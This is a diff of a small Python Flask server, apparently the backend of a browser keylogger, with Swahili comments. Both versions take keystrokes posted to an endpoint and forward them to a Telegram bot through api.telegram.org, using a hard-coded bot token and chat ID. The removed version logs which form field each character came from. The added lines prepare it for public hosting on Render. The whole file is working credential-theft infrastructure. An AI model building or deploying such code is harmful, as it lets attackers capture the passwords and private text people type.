@@ -1,28 +1,29 @@
+
 from flask import Flask, request
 import requests
+import os
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8246860772:AAF8iybKlcwUQdeSAv4s0tJurejRHcbAKhY"     # Replace na token yako
-CHAT_ID = "8303486983"         # Replace na chat ID yako
+BOT_TOKEN = "8246860772:AAF8iybKlcwUQdeSAv4s0tJurejRHcbAKhY"  # 👈 weka token yako hapa
+CHAT_ID = "8303486983"      # 👈 weka chat ID hapa
 
-@app.route("/keypress", methods=["POST"])
-def keylogger():
+@app.route("/send", methods=["POST"])
+def send_to_telegram():
     data = request.get_json()
-    field = data.get("field")
-    char = data.get("char")
+    key = data.get("key")
 
-    message = f"⌨️ Keypress from {field}: `{char}`"
+    if key:
+        message = f"🖥️ Keylog: {key}"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": message
+        }
+        requests.post(url, data=payload)
 
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-
-    requests.post(url, data=payload)
-    return "Logged"
+    return "OK"
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    port = int(os.environ.get("PORT", 5000))  # 👈 PORT kwa ajili ya Render
+    app.run(host="0.0.0.0", port=port)
